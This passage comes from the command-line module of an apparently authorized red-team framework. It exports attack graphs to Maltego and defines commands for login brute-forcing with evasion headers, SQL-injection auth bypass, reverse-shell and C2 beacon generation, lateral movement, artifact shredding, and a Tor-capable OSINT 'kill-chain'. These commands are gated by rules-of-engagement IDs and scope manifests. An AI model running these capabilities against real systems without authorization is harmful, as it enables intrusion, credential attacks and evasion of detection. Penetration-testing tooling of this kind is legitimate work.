            '  <key id="analyst_properties_json" for="node" attr.name="analyst_properties_json" attr.type="string"/>',
            '  <key id="layout_x" for="node" attr.name="layout_x" attr.type="double"/>',
            '  <key id="layout_y" for="node" attr.name="layout_y" attr.type="double"/>',
            '  <key id="weight" for="edge" attr.name="weight" attr.type="double"/>',
            '  <key id="edge_type" for="edge" attr.name="edge_type" attr.type="string"/>',
            '  <key id="relation" for="edge" attr.name="relation" attr.type="string"/>',
            '  <key id="edge_critical" for="edge" attr.name="critical" attr.type="string"/>',
            '  <key id="edge_metadata_json" for="edge" attr.name="metadata_json" attr.type="string"/>',
            '  <graph id="G" edgedefault="directed">',
        ]
        for node in graph.nodes:
            entity_type, primary_property, primary_value = _primary_entity_type(node)
            x, y = positions.get(str(node.node_id), (0.0, 0.0))
            lines.append(f'    <node id="{_xs.quoteattr(node.node_id)[1:-1]}">')
            lines.append(f'      <data key="label">{_xs.escape(str(node.label or ""))}</data>')
            lines.append(f'      <data key="entity_type">{_xs.escape(_node_type_text(node))}</data>')
            lines.append(f'      <data key="maltego_entity_type">{_xs.escape(entity_type)}</data>')
            lines.append(f'      <data key="primary_property">{_xs.escape(primary_property)}</data>')
            lines.append(f'      <data key="primary_value">{_xs.escape(primary_value)}</data>')
            lines.append(f'      <data key="severity">{_xs.escape(_severity_text(node))}</data>')
            lines.append(f'      <data key="critical">{"1" if node.on_critical_path else "0"}</data>')
            lines.append(f'      <data key="source_table">{_xs.escape(str(node.source_table or ""))}</data>')
            lines.append(f'      <data key="source_id">{int(node.source_id or 0)}</data>')
            lines.append(f'      <data key="metadata_json">{_xs.escape(_node_metadata_text(node))}</data>')
            lines.append(
                "      <data key=\"analyst_properties_json\">"
                f"{_xs.escape(_json.dumps(_node_analyst_properties(node), ensure_ascii=False, separators=(',', ':'), sort_keys=True))}"
                "</data>"
            )
            lines.append(f'      <data key="layout_x">{x:.1f}</data>')
            lines.append(f'      <data key="layout_y">{y:.1f}</data>')
            lines.append("    </node>")
        for edge in graph.edges:
            lines.append(
                f'    <edge source="{_xs.quoteattr(edge.source_node_id)[1:-1]}" '
                f'target="{_xs.quoteattr(edge.target_node_id)[1:-1]}">'
            )
            lines.append(f'      <data key="weight">{float(getattr(edge, "weight", 1.0))}</data>')
            lines.append(
                f'      <data key="edge_type">{_xs.escape(str(getattr(edge, "edge_type", "") or ""))}</data>'
            )
            lines.append(f'      <data key="relation">{_xs.escape(_edge_relation(edge))}</data>')
            lines.append(
                f'      <data key="edge_critical">{"1" if bool(getattr(edge, "on_critical_path", False)) else "0"}</data>'
            )
            lines.append(f'      <data key="edge_metadata_json">{_xs.escape(_edge_metadata_text(edge))}</data>')
            lines.append("    </edge>")
        lines.append("  </graph>")
        lines.append("</graphml>")
        return "\n".join(lines) + "\n"

    def _maltego_workspace_graphml() -> str:
        _ElementTree.register_namespace("", "http://graphml.graphdrawing.org/xmlns")
        _ElementTree.register_namespace("mtg", "http://maltego.paterva.com/xml/mtgx")
        graphml = _ElementTree.Element(
            "graphml",
            {
                "xmlns": "http://graphml.graphdrawing.org/xmlns",
                "xmlns:mtg": "http://maltego.paterva.com/xml/mtgx",
            },
        )
        for attrs in (
            {"id": "mtg_entity", "for": "node", "attr.name": "MaltegoEntity", "attr.type": "string"},
            {"id": "mtg_entity_renderer", "for": "node", "attr.name": "EntityRenderer", "yfiles.type": "nodegraphics"},
            {"id": "mtg_link", "for": "edge", "attr.name": "MaltegoLink", "attr.type": "string"},
            {"id": "mtg_link_renderer", "for": "edge", "attr.name": "LinkRenderer", "yfiles.type": "edgegraphics"},
        ):
            _ElementTree.SubElement(graphml, "key", attrs)

        graph_el = _ElementTree.SubElement(graphml, "graph", {"id": "G", "edgedefault": "directed"})
        positions = _layout_positions()

        def _property(parent, name: str, value: str, *, display_name: str = "") -> None:
            attrs = {
                "name": name,
                "type": "string",
                "hidden": "false",
                "nullable": "true",
                "readonly": "false",
            }
            if display_name:
                attrs["displayName"] = display_name
            prop = _ElementTree.SubElement(parent, "{http://maltego.paterva.com/xml/mtgx}Property", attrs)
            val = _ElementTree.SubElement(prop, "{http://maltego.paterva.com/xml/mtgx}Value")
            val.text = value

        for node in graph.nodes:
            node_el = _ElementTree.SubElement(graph_el, "node", {"id": str(node.node_id)})
            entity_type, primary_property, primary_value = _primary_entity_type(node)
            entity_data = _ElementTree.SubElement(node_el, "data", {"key": "mtg_entity"})
            entity_el = _ElementTree.SubElement(
                entity_data,
                "{http://maltego.paterva.com/xml/mtgx}MaltegoEntity",
                {"type": entity_type},
            )
            properties_el = _ElementTree.SubElement(
                entity_el,
                "{http://maltego.paterva.com/xml/mtgx}Properties",
            )
            _property(properties_el, primary_property, primary_value, display_name="Primary Value")
            _property(properties_el, "forge.label", str(node.label or ""), display_name="FORGE Label")
            _property(properties_el, "forge.node_type", _node_type_text(node), display_name="FORGE Node Type")
            _property(properties_el, "forge.severity", _severity_text(node), display_name="FORGE Severity")
            _property(properties_el, "forge.source_table", str(node.source_table or ""), display_name="FORGE Source Table")
            _property(properties_el, "forge.source_id", str(node.source_id), display_name="FORGE Source ID")
            _property(
                properties_el,
                "forge.metadata_json",
                _node_metadata_text(node),
                display_name="FORGE Metadata JSON",
            )
            for property_name, property_value in _node_analyst_properties(node).items():
                _property(
                    properties_el,
                    f"forge.{property_name}",
                    property_value,
                    display_name=f"FORGE {property_name.replace('_', ' ').title()}",
                )
            _property(
                properties_el,
                "forge.on_critical_path",
                "1" if bool(node.on_critical_path) else "0",
                display_name="FORGE Critical Path",
            )

            renderer_data = _ElementTree.SubElement(node_el, "data", {"key": "mtg_entity_renderer"})
            renderer_el = _ElementTree.SubElement(
                renderer_data,
                "{http://maltego.paterva.com/xml/mtgx}EntityRenderer",
            )
            x, y = positions.get(str(node.node_id), (0.0, 0.0))
            _ElementTree.SubElement(
                renderer_el,
                "{http://maltego.paterva.com/xml/mtgx}Position",
                {"x": f"{x:.1f}", "y": f"{y:.1f}"},
            )

        for edge_index, edge in enumerate(graph.edges, start=1):
            edge_el = _ElementTree.SubElement(
                graph_el,
                "edge",
                {
                    "id": f"e{edge_index}",
                    "source": str(edge.source_node_id),
                    "target": str(edge.target_node_id),
                },
            )
            link_data = _ElementTree.SubElement(edge_el, "data", {"key": "mtg_link"})
            link_el = _ElementTree.SubElement(
                link_data,
                "{http://maltego.paterva.com/xml/mtgx}MaltegoLink",
                {"type": "maltego.link.manual-link"},
            )
            link_props = _ElementTree.SubElement(
                link_el,
                "{http://maltego.paterva.com/xml/mtgx}Properties",
            )
            _property(
                link_props,
                "maltego.link.manual.type",
                _edge_relation(edge),
                display_name="Label",
            )
            _property(
                link_props,
                "forge.edge_type",
                str(getattr(edge, "edge_type", "") or ""),
                display_name="FORGE Edge Type",
            )
            _property(
                link_props,
                "forge.weight",
                str(float(getattr(edge, "weight", 1.0))),
                display_name="FORGE Weight",
            )
            _property(
                link_props,
                "forge.on_critical_path",
                "1" if bool(getattr(edge, "on_critical_path", False)) else "0",
                display_name="FORGE Critical Path",
            )
            _property(
                link_props,
                "forge.metadata_json",
                _edge_metadata_text(edge),
                display_name="FORGE Metadata JSON",
            )

            link_renderer_data = _ElementTree.SubElement(edge_el, "data", {"key": "mtg_link_renderer"})
            _ElementTree.SubElement(
                link_renderer_data,
                "{http://maltego.paterva.com/xml/mtgx}LinkRenderer",
            )

        return _ElementTree.tostring(graphml, encoding="utf-8", xml_declaration=True).decode("utf-8")

    mermaid_str = dot_str = json_str = ""

    if requested in (OutputFormat.MERMAID, OutputFormat.ALL):
        mermaid_str = MermaidRenderer().render_bounded_preview(graph)
        (out_dir / f"{stem}.mmd").write_text(mermaid_str, encoding="utf-8")
        console.print(f"[green]Mermaid:[/green] {out_dir / (stem + '.mmd')}")

    if requested in (OutputFormat.DOT, OutputFormat.ALL):
        dot_str = DotRenderer().render(graph)
        (out_dir / f"{stem}.dot").write_text(dot_str, encoding="utf-8")
        console.print(f"[green]DOT:[/green] {out_dir / (stem + '.dot')}")

    if requested in (OutputFormat.JSON, OutputFormat.ALL):
        json_str = graph.model_dump_json(indent=2)
        (out_dir / f"{stem}.json").write_text(json_str, encoding="utf-8")
        console.print(f"[green]JSON:[/green] {out_dir / (stem + '.json')}")

    if requested in (OutputFormat.MALTEGO, OutputFormat.ALL):
        # Generic GraphML: portable import artifact used by the dashboard and
        # third-party tooling. The native MTGX workspace archive is emitted too.
        graphml_path = out_dir / f"{stem}.graphml"
        graphml_path.write_text(_generic_graphml(), encoding="utf-8")

        mtgx_path = out_dir / f"{stem}.mtgx"
        mtgx_manifest = _mtgx_manifest_payload()
        with _zipfile.ZipFile(mtgx_path, mode="w", compression=_zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("Graphs/Graph1.graphml", _maltego_workspace_graphml())
            archive.writestr(
                "manifest.json",
                _json.dumps(mtgx_manifest, indent=2, sort_keys=True),
            )
            archive.writestr("README.md", _mtgx_readme_text(mtgx_manifest))

        # Companion CSVs: friendly for "New Entities From CSV" wizard
        import csv as _csv  # noqa: PLC0415
        nodes_csv = out_dir / f"{stem}_nodes.csv"
        edges_csv = out_dir / f"{stem}_edges.csv"
        with nodes_csv.open("w", newline="", encoding="utf-8") as fh:
            w = _csv.writer(fh)
            w.writerow(["EntityID", "EntityType", "Label", "Severity",
                        "OnCriticalPath", "SourceTable", "MetadataJSON"])
            for n in graph.nodes:
                nt = n.node_type.value if hasattr(n.node_type, "value") else str(n.node_type)
                sev = n.severity.value if n.severity and hasattr(n.severity, "value") else (n.severity or "")
                w.writerow([n.node_id, nt, n.label, sev,
                            "1" if n.on_critical_path else "0", n.source_table,
                            _node_metadata_text(n)])
        with edges_csv.open("w", newline="", encoding="utf-8") as fh:
            w = _csv.writer(fh)
            w.writerow(["Source", "Target", "Weight", "Relation", "MetadataJSON"])
            for e in graph.edges:
                w.writerow([
                    e.source_node_id,
                    e.target_node_id,
                    float(getattr(e, "weight", 1.0)),
                    _edge_relation(e),
                    _edge_metadata_text(e),
                ])

        console.print(f"[green]Maltego MTGX:[/green] {mtgx_path}")
        console.print(f"[green]Maltego GraphML:[/green] {graphml_path}")
        console.print(f"[green]Nodes CSV:[/green] {nodes_csv}")
        console.print(f"[green]Edges CSV:[/green] {edges_csv}")
        console.print(
            "[dim]Open the .mtgx file in Maltego Graph (Desktop), or import the "
            ".graphml file in Community Edition if you need the lightweight path.[/dim]"
        )

    if snapshot:
        builder.write_snapshot(graph, mermaid=mermaid_str, dot=dot_str)
        console.print("[green]Snapshot written to attack_graph_snapshots.[/green]")

    console.print(
        f"[bold]Graph:[/bold] {graph.node_count} nodes · {graph.edge_count} edges · "
        f"critical path weight: {graph.critical_path_weight:.1f}"
    )


@auth_app.command("brute")
def auth_brute(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    target: str = typer.Option(..., "--target"),
    username: str = typer.Option("admin", "--username"),
    dictionary_type: str = typer.Option("dynamic", "--dictionary-type"),
    max_attempts: Optional[int] = typer.Option(None, "--max-attempts"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct live auth brute-force checks.",
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct live auth brute-force gating.",
    ),
) -> None:
    import httpx  # noqa: PLC0415

    from forge.utils.intel.credential_generator import generate_dynamic_passwords  # noqa: PLC0415
    from forge.utils.intel.evasion import build_evasion_headers, evasion_sleep  # noqa: PLC0415

    cfg = ForgeConfig.load()
    _direct_cli_require_roe(roe_id, command_name="auth brute")
    db_path = cfg.engagement_db_path(engagement)
    _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=db_path,
        scope_manifest=scope_manifest,
        target=target,
        seed_type="url",
    )
    attempts_limit = max_attempts or cfg.auth_max_attempts
    host = (urlparse(target).hostname or "target").strip()
    if dictionary_type == "dynamic":
        candidates = generate_dynamic_passwords(host, limit=attempts_limit)
    else:
        candidates = generate_dynamic_passwords(host, limit=attempts_limit)
    conn = sqlite3.connect(db_path)
    success = 0
    tested = 0
    try:
        for password in candidates[:attempts_limit]:
            headers = build_evasion_headers()
            try:
                response = httpx.post(
                    target,
                    data={"username": username, "password": password},
                    headers=headers,
                    timeout=8.0,
                    follow_redirects=False,
                )
                body_lower = response.text.lower()
                ok = response.status_code in {200, 302} and any(
                    token in body_lower for token in ("dashboard", "logout", "welcome")
                )
                response_hint = body_lower[:200]
                status_code = response.status_code
            except Exception as exc:
                ok = False
                response_hint = str(exc)[:200]
                status_code = 0
            conn.execute(
                """
                INSERT INTO auth_test_results (
                    engagement_id, target_url, form_data, attack_type, success, response_data
                ) VALUES (?, ?, ?, 'brute-force', ?, ?)
                """,
                (
                    int(engagement),
                    target,
                    f'{{"username":"{username}","password":"***"}}',
                    1 if ok else 0,
                    f'{{"status_code":{status_code},"hint":{json.dumps(response_hint)}}}',
                ),
            )
            tested += 1
            if ok:
                success += 1
            if cfg.auth_rate_limit > 0:
                evasion_sleep()
                time.sleep(max(0.0, 60.0 / float(cfg.auth_rate_limit)))
        conn.commit()
    finally:
        conn.close()
    console.print(f"[green]Auth brute attempts:[/green] {tested}")
    console.print(f"[green]Auth brute successes:[/green] {success}")


@auth_app.command("bypass")
def auth_bypass(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    target: str = typer.Option(..., "--target"),
    technique: str = typer.Option("sql-injection", "--technique"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct live auth-bypass checks.",
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct live auth-bypass gating.",
    ),
) -> None:
    from forge.phase4.auth_bypass import run_bypass_assessment  # noqa: PLC0415

    cfg = ForgeConfig.load()
    _direct_cli_require_roe(roe_id, command_name="auth bypass")
    db_path = cfg.engagement_db_path(engagement)
    scope_values, url_prefixes = _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=db_path,
        scope_manifest=scope_manifest,
        target=target,
        seed_type="url",
    )
    result = run_bypass_assessment(
        engagement_id=int(engagement),
        db_path=db_path,
        target_url=target,
        technique=technique,
        scope_values=scope_values,
        url_prefixes=url_prefixes,
        require_scope=True,
    )
    if result.success:
        console.print(
            f"[bold yellow]Potential bypass detected[/bold yellow] "
            f"{result.technique} @ {result.target_url}"
        )
    else:
        console.print(f"[green]No bypass detected[/green] {result.technique} @ {result.target_url}")


# ---------------------------------------------------------------------------
# Phase 5 — Post-Exploitation
# ---------------------------------------------------------------------------


def _assert_offensive_cli(phase_label: str) -> None:
    from forge.config import is_offensive_enabled, prompt_offensive_upgrade  # noqa: PLC0415

    if not is_offensive_enabled():
        if not prompt_offensive_upgrade(phase_label):
            console.print(
                f"[bold red]ERROR:[/bold red] {phase_label} is disabled "
                "(FORGE_SAFE_MODE=1). Set FORGE_SAFE_MODE=0 to enable offensive modules."
            )
            raise typer.Exit(code=1)


@post_app.command("shell")
def post_shell(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    lhost: str = typer.Option(..., "--lhost"),
    lport: int = typer.Option(443, "--lport"),
    gen_cert: bool = typer.Option(False, "--gen-cert"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before generating post-exploitation payloads.",
    ),
) -> None:
    """Generate a TLS reverse shell payload (Module 5-F)."""
    _assert_offensive_cli("Phase 5 post-exploitation")
    _direct_cli_require_roe(roe_id, command_name="post shell")
    from forge.utils.post.template_engine import generate_shell  # noqa: PLC0415

    generate_shell(
        engagement_id=engagement,
        lhost=lhost,
        lport=lport,
        gen_cert=gen_cert,
    )


@post_app.command("beacon")
def post_beacon(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    agent_type: str = typer.Option("python", "--agent-type", help="python or powershell"),
    channel: Optional[str] = typer.Option(None, "--channel", help="https,dns,smb,icmp"),
    c2_urls: str = typer.Option(..., "--c2-urls", help="Comma-separated C2 URLs."),
    interval: Optional[int] = typer.Option(None, "--interval", help="Beacon interval seconds."),
    jitter_pct: int = typer.Option(25, "--jitter-pct", help="Gaussian jitter percentage."),
    output: str = typer.Option(..., "--output", help="Output path for generated beacon."),
    smb_pipe_name: Optional[str] = typer.Option(None, "--smb-pipe-name"),
    smb_target: Optional[str] = typer.Option(None, "--smb-target"),
    smb_username: Optional[str] = typer.Option(None, "--smb-username"),
    smb_domain: Optional[str] = typer.Option(None, "--smb-domain"),
    smb_fallback_timeout: Optional[int] = typer.Option(None, "--smb-fallback-timeout"),
    icmp_target_ip: Optional[str] = typer.Option(None, "--icmp-target-ip"),
    icmp_packet_interval: Optional[int] = typer.Option(None, "--icmp-packet-interval"),
    enable_fallback: bool = typer.Option(True, "--enable-fallback/--disable-fallback"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before generating C2 beacon payloads.",
    ),
) -> None:
    _assert_offensive_cli("Phase 5 C2 beacon generation")
    _direct_cli_require_roe(roe_id, command_name="post beacon")
    from forge.models.pydantic_models import C2BeaconConfig, C2Channel  # noqa: PLC0415
    from forge.utils.post.session_manager import C2Generator  # noqa: PLC0415

    cfg = ForgeConfig.load()
    selected_channel = (channel or cfg.c2_default_channel).strip().lower()
    selected_interval = interval if interval is not None else (
        cfg.c2_icmp_packet_interval if selected_channel == "icmp" else 300
    )
    urls = [item.strip() for item in c2_urls.split(",") if item.strip()]
    config_payload = {
        "engagement_id": int(engagement),
        "beacon_interval": selected_interval,
        "jitter_pct": jitter_pct,
        "c2_urls": urls,
        "channel": selected_channel,
        "smb_pipe_name": smb_pipe_name or cfg.c2_smb_pipe_name,
        "smb_fallback_timeout": smb_fallback_timeout or cfg.c2_smb_fallback_timeout,
        "smb_username": smb_username,
        "smb_domain": smb_domain,
        "icmp_target_ip": icmp_target_ip or cfg.c2_icmp_target_ip,
        "icmp_packet_interval": icmp_packet_interval or cfg.c2_icmp_packet_interval,
    }
    beacon_cfg = C2BeaconConfig(**config_payload)
    channel_cfg: dict[str, str | int] = {}
    icmp_cfg: dict[str, str | int] = {}
    if beacon_cfg.channel == C2Channel.SMB:
        channel_cfg = {
            "pipe_name": beacon_cfg.smb_pipe_name or cfg.c2_smb_pipe_name,
            "target": smb_target or "127.0.0.1",
            "username": beacon_cfg.smb_username or "",
            "domain": beacon_cfg.smb_domain or "",
            "fallback_timeout": beacon_cfg.smb_fallback_timeout,
        }
    if beacon_cfg.channel == C2Channel.ICMP:
        icmp_cfg = {
            "target_ip": beacon_cfg.icmp_target_ip or cfg.c2_icmp_target_ip,
            "max_payload_size": beacon_cfg.icmp_max_payload_size,
        }
    generator = C2Generator(
        db_path=cfg.engagement_db_path(engagement),
        engagement_id=int(engagement),
    )
    build = generator.generate(
        agent_type=agent_type,
        channel=beacon_cfg.channel.value,
        c2_urls=beacon_cfg.c2_urls,
        interval=beacon_cfg.icmp_packet_interval if beacon_cfg.channel == C2Channel.ICMP else beacon_cfg.beacon_interval,
        jitter_pct=beacon_cfg.jitter_pct,
        smb_config=channel_cfg or None,
        icmp_config=icmp_cfg or None,
        enable_fallback=enable_fallback,
    )
    generator.save(build, output_path=Path(output))
    console.print(f"[green]✓ Beacon generated:[/green] {output}")


@post_app.command("lateral")
def post_lateral(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    target_host: str = typer.Option(..., "--target"),
    technique: str = typer.Option("smb_exec", "--technique"),
    cleanup_on_exit: bool = typer.Option(True, "--cleanup-on-exit/--no-cleanup"),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help="ROE identifier required before direct lateral movement.",
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        help="Scope manifest path/JSON for direct lateral movement gating.",
    ),
) -> None:
    """Execute lateral movement to a target host (Module 5-J)."""
    _assert_offensive_cli("Phase 5 lateral movement")
    _direct_cli_require_roe(roe_id, command_name="post lateral")
    cfg = ForgeConfig.load()
    _direct_cli_load_scope_lists(
        engagement_id=int(engagement),
        db_path=cfg.engagement_db_path(engagement),
        scope_manifest=scope_manifest,
        target=target_host,
        seed_type="domain",
    )
    import questionary  # noqa: PLC0415

    confirmed = questionary.confirm(
        f"CONFIRM: Lateral movement to {target_host!r} via {technique!r}. Proceed?"
    ).ask()
    if not confirmed:
        raise typer.Exit()

    from forge.utils.post.remote_exec import run_lateral  # noqa: PLC0415

    run_lateral(
        engagement_id=engagement,
        target_host=target_host,
        technique=technique,
        cleanup_on_exit=cleanup_on_exit,
    )


# ---------------------------------------------------------------------------
# Phase 6 — LLM-Assisted Reporting
# ---------------------------------------------------------------------------


@report_app.command("generate")
def report_generate(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    output: Optional[str] = typer.Option(
        None,
        "--output",
        "-o",
        help=(
            "Output path for the report family. Accepts .md, .json, .pdf, or a directory. "
            "Last-resort raw structured fallback exports emit JSON/CSV if standard report "
            "persistence fails."
        ),
    ),
    yes: bool = typer.Option(
        False,
        "--yes",
        "-y",
        help=(
            "Skip the interactive write-confirmation prompt. "
            "Recommended for CI, subprocesses, and any non-TTY invocation "
            "(otherwise prompt_toolkit raises NoConsoleScreenBufferError on Windows)."
        ),
    ),
    provider: Optional[str] = typer.Option(
        None,
        "--provider",
        envvar="FORGE_LLM_PROVIDER",
        help=(
            "LLM provider to route Phase 6 inference through. "
            "One of: auto (recommended — detects configured providers in "
            "FORGE_LLM_CASCADE_ORDER or LLM_CASCADE_ORDER, then falls back "
            "to local llama_cpp and finally the deterministic template), "
            "template (deterministic Markdown report from engagement data, "
            "no LLM required — always works), llama_cpp (local Qwen "
            "2.5-1.5B), kiro_cli, claude_code, codex_cli, gemini_cli, "
            "bedrock_anthropic, openai_compatible. "
            "openai_compatible additionally requires FORGE_OPENAI_BASE_URL "
            "and FORGE_OPENAI_MODEL. Set FORGE_LLM_PROVIDER=auto in .env "
            "to make every report route through the best available backend."
        ),
    ),
    max_loops: Optional[int] = typer.Option(
        None,
        "--max-loops",
        help=(
            "Maximum LLM correction retry loops (default 5). Cloud "
            "providers usually produce an acceptable report on the "
            "first attempt; set --max-loops 0 to disable retries and "
            "cut runtime by ~5x for high-quality backends. Local Qwen "
            "may benefit from the default 5 attempts."
        ),
    ),
) -> None:
    """Synthesise engagement report via a configurable LLM backend (Phase 6)."""
    from forge.phase6.report_synthesizer import synthesise  # noqa: PLC0415

    cfg = ForgeConfig.load()
    db_path = cfg.engagement_db_path(engagement)
    engagement_id = int(engagement)

    _cli_audit(
        db_path, engagement_id, "phase6", "report_synthesizer",
        "report_generate_start", target=output,
        result=f"assume_yes={yes} provider={provider or 'llama_cpp'} max_loops={max_loops if max_loops is not None else '<default>'}",
    )
    try:
        result_path = synthesise(
            engagement_id=engagement,
            output_path=output,
            assume_yes=yes,
            provider=provider,
            max_correction_loops=max_loops,
        )
    except Exception as exc:
        _cli_audit(
            db_path, engagement_id, "phase6", "report_synthesizer",
            "report_generate_failed", target=output,
            result=f"{type(exc).__name__}: {str(exc)[:180]}",
        )
        raise
    _cli_audit(
        db_path, engagement_id, "phase6", "report_synthesizer",
        "report_generate_complete", target=str(result_path) if result_path else None,
        result=f"success provider={provider or 'llama_cpp'}",
    )


# ---------------------------------------------------------------------------
# Utility commands
# ---------------------------------------------------------------------------


@app.command("clean")
def clean(
    engagement: str = typer.Option(..., "--engagement", "-e"),
    confirm: bool = typer.Option(False, "--confirm", help="Skip interactive confirmation prompt."),
) -> None:
    """
    Securely wipe all on-disk artifacts for an engagement.

    Shreds payload files, credential caches, exfiltration staging, and
    removes the engagement DB. Irreversible.
    """
    if not confirm:
        import questionary  # noqa: PLC0415

        ok = questionary.confirm(
            f"Permanently destroy all artifacts for engagement {engagement!r}?"
        ).ask()
        if not ok:
            raise typer.Exit()

    from forge.opsec.cleanup import run_clean  # noqa: PLC0415

    run_clean(engagement_id=engagement)


@app.command("kill-chain")
def kill_chain(
    seed: str = typer.Argument(
        ...,
        help="ANY identifier: domain (hong-yi.me), IP (10.0.0.5), email "
             "(user@x.com), phone (+6592348112), username (@handle), "
             "company name (\"Acme Corp\"), or full name in quotes "
             "(\"Bryan Seah\").",
    ),
    related_seed: Optional[list[str]] = typer.Option(
        None,
        "--related-seed",
        help="Additional seed belonging to the same engagement. Repeat the flag for multi-seed runs.",
    ),
    engagement: Optional[str] = typer.Option(
        None, "--engagement", "-e",
        help="Engagement ID. Omit to auto-derive next available ID and "
             "auto-create the engagement row with the seed as scope.",
    ),
    resume: bool = typer.Option(
        True,
        "--resume/--no-resume",
        help="Reuse persisted seed-run state and skip fan-outs already completed for this engagement.",
    ),
    max_iter: int = typer.Option(
        7, "--max-iter",
        help="Spider iterations (default 7). Loop breaks early on stable snapshot.",
    ),
    tor: bool = typer.Option(
        False, "--tor",
        help="Route every subcommand through vendored Tor. Adds ~5s per module for bootstrap.",
    ),
    dry_run: bool = typer.Option(
        False, "--dry-run",
        help="Log every intended action without executing outbound calls. Nothing hits the network.",
    ),
    attack_mode: bool = typer.Option(
        False, "--attack-mode",
        help="ACTIVE recon: adds port scan + credential validation "
             "(SSH/SMB/RDP/FTP/HTTP). Trips IDS/WAF, requires signed ROE.",
    ),
    roe_id: Optional[str] = typer.Option(
        None,
        "--roe-id",
        envvar="FORGE_ROE_ID",
        help=(
            "Rules-of-engagement or written-authorization reference recorded "
            "with live probing/tool-execution metadata."
        ),
    ),
    scope_manifest: Optional[str] = typer.Option(
        None,
        "--scope-manifest",
        envvar="FORGE_SCOPE_MANIFEST",
        help=(
            "JSON file path or inline JSON declaring authorized domains, URL prefixes, "
            "IP ranges, and exact non-network seeds for live sensitive execution."
        ),
    ),
    skip_cloud: bool = typer.Option(
        False, "--skip-cloud",
        help="Skip cloud discovery (Supabase/Firebase/Amplify/GCP/Vercel/Netlify).",
    ),
    skip_keyscan: bool = typer.Option(
        False, "--skip-keyscan",
        help="Skip GitHub keyscan (protects FORGE_GITHUB_TOKEN quota).",
    ),
    parallel_fanout: int = typer.Option(
        2,
        "--parallel-fanout",
        help="Maximum concurrent passive fan-out subprocesses per batch (default 2, max 4).",
    ),
    report_provider: Optional[str] = typer.Option(
        None,
        "--report-provider",
        envvar="FORGE_LLM_PROVIDER",
        help=(
            "Phase 6 report backend override for the final engagement narrative. "
            "Use auto to respect FORGE_LLM_CASCADE_ORDER/LLM_CASCADE_ORDER, then "
            "fall back to local llama_cpp and finally the deterministic template, "
            "template for deterministic reporting only, or any supported provider name."
        ),
    ),
    report_max_loops: Optional[int] = typer.Option(
        None,
        "--report-max-loops",
        help=(
            "Override the final report correction-loop budget passed to `forge report generate`. "
            "Use 0 to disable retries."
        ),
    ),
    auto_run_detected: bool = typer.Option(
        False,
        "--auto-run-detected",
        help=(
            "After the main engagement run, automatically execute any runnable "
            "detected follow-on modules instead of only listing or prompting for them."
        ),
    ),
) -> None:
    """Depth-first OSINT spider against any identifier.

    SEED can be a domain, IPv4, email, phone (E.164 with +), username
    (@handle), company name, or a full name in quotes. The kill-chain auto-detects the
    seed type and routes to the appropriate initial fan-out; every
    subsequent iteration then feeds new discoveries back through all
    applicable modules (subdomain enum, DNS, Wayback, RDAP, harvest,
    Playwright fetch, cloud discovery, email chain, keyscan) until the
    engagement DB stops growing or --max-iter is hit.

    Every action is scope-gated + hash-chain audit-logged. All outputs
    land in .forge_data/engagements/<engagement_id>.db plus a Phase 6
    Markdown report + Maltego graph workspace artifacts.
    """
    from typer.models import ArgumentInfo as _ArgumentInfo, OptionInfo as _OptionInfo  # noqa: PLC0415

    def _is_typer_default(value: object) -> bool:
        return isinstance(value, (_OptionInfo, _ArgumentInfo))

    def _normalize_roe_id(value: object) -> str:
        return " ".join(str(value or "").strip().split())[:160]

    related_seed = None if _is_typer_default(related_seed) else related_seed
    engagement = None if _is_typer_default(engagement) else engagement
    resume = True if _is_typer_default(resume) else bool(resume)
    try:
        max_iter = normalize_kill_chain_max_iter(
            None if _is_typer_default(max_iter) else max_iter,
            default=7,
        )
    except ValueError as exc:
        raise typer.BadParameter(str(exc)) from exc
    tor = False if _is_typer_default(tor) else bool(tor)
    dry_run = False if _is_typer_default(dry_run) else bool(dry_run)
    attack_mode = False if _is_typer_default(attack_mode) else bool(attack_mode)
    roe_id = (
        os.environ.get("FORGE_ROE_ID", "")
        if _is_typer_default(roe_id) or roe_id is None
        else str(roe_id)
    )
    roe_id = _normalize_roe_id(roe_id)
    scope_manifest = (
        os.environ.get("FORGE_SCOPE_MANIFEST", "")
        if _is_typer_default(scope_manifest) or scope_manifest is None
        else str(scope_manifest)
    )
    scope_manifest = str(scope_manifest or "").strip()
    skip_cloud = False if _is_typer_default(skip_cloud) else bool(skip_cloud)
    skip_keyscan = False if _is_typer_default(skip_keyscan) else bool(skip_keyscan)
    parallel_fanout = 2 if _is_typer_default(parallel_fanout) else int(parallel_fanout)
    report_provider = None if _is_typer_default(report_provider) else report_provider
    report_max_loops = None if _is_typer_default(report_max_loops) else report_max_loops
    auto_run_detected = False if _is_typer_default(auto_run_detected) else bool(auto_run_detected)
    # ─── Compatibility aliases for internal loop code (was 14 flags) ───
    # The kill-chain body still references the pre-consolidation names.
    # Rather than rewrite ~30 references, map them here once.
    use_tor = tor
    max_iterations = max_iter
    dry_run_all = dry_run
    dry_run_keyscan = dry_run              # dry_run supersedes both dry-run flags
    active_recon = attack_mode
    credential_validate = attack_mode
    resume_enabled = resume
    no_playwright = False                  # Playwright is always on now
    wayback_full = True                    # Wayback is always full-paginated
    report_provider = str(report_provider or "").strip() or None
    if report_max_loops is not None and int(report_max_loops) < 0:
